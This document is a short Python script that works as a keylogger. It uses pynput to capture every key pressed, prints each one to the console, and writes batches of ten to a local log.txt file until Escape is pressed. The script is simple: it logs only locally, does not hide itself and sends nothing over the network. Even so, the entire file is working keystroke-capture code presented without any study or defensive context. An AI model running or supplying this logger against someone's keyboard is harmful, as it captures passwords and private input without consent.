import pynput
from pynput.keyboard import Key, Listener

# Initialize variables for key tracking
count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)  # Add pressed key to list
    count += 1  # Increment key press count
    print("{0} pressed".format(key))

    # After 10 key presses, write to file and reset
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    # Open file in append mode
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", " ")

            # Handle special keys (space, enter)
            if k.find("space") != -1:
                f.write(' ')  # Space key
            elif k.find("enter") != -1:
                f.write('\n')  # Enter key
            elif k.find("Key") == -1:
                f.write(k)  # Regular key

def on_release(key):
    # Stop listener when 'esc' is pressed
    if key == Key.esc:
        return False

# Start listener to capture key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

